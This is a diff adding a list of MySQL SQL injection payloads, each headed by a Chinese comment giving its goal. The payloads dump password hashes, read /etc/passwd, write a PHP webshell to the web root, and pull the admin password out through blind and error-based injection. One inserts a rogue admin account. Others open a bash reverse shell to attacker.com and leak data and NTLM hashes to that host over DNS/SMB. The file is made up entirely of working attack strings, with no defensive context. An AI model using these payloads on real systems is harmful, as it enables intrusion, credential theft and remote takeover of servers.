@@ -1,0 +1,34 @@
+# MySQL - UNION 查询窃取全部用户密码哈希
+' UNION SELECT 1,user,password,4,5 FROM mysql.user--
+# MySQL - LOAD_FILE 读取系统密码文件
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5--
+# MySQL - INTO OUTFILE 写入 Webshell
+' UNION SELECT 1,'<?php system($_GET[1]);?>',3,4,5 INTO OUTFILE '/var/www/html/shell.php'--
+# MySQL - INTO DUMPFILE 写入二进制文件
+' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b315d293b3f3e INTO DUMPFILE '/var/www/html/shell.php'--
+# MySQL - SLEEP 时间盲注获取管理员密码 (逐字符)
+' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
+# MySQL - BENCHMARK 延时注入替代 SLEEP
+' AND IF(SUBSTRING(user(),1,1)='r',BENCHMARK(5000000,MD5('x')),0)--
+# MySQL - updatexml 报错注入泄露数据
+' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)--
+# MySQL - extractvalue 报错注入泄露数据
+' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
+# MySQL - NAME_CONST 报错注入
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) AS x)--
+# MySQL - 双查询报错注入 (floor/rand)
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+# MySQL - 多语句堆叠查询创建管理员用户
+'; INSERT INTO users(username,password,role) VALUES('hacker','p@ss','admin')--
+# MySQL - 堆叠查询执行系统命令 (sys_exec UDF)
+'; SELECT sys_exec('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')--
+# MySQL - DNS 带外数据泄露 (UNC Path SMB 窃取 NTLM Hash)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))--
+# MySQL - DNS 带外数据泄露 (Windows)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\',(SELECT user())))--
+# MySQL - 无 information_schema 提取表名 (sys.schema_auto_increment_columns)
+' UNION SELECT table_name FROM sys.schema_auto_increment_columns WHERE table_schema=database()--
+# MySQL - 无列名提取数据 (JOIN USING)
+' UNION SELECT * FROM (SELECT * FROM users AS a JOIN users AS b USING(id,username,password))x--
+# MySQL - 无列名提取数据 (等值比较)
+' UNION SELECT `2` FROM (SELECT 1,2,3 UNION SELECT * FROM users)x LIMIT 1,1--
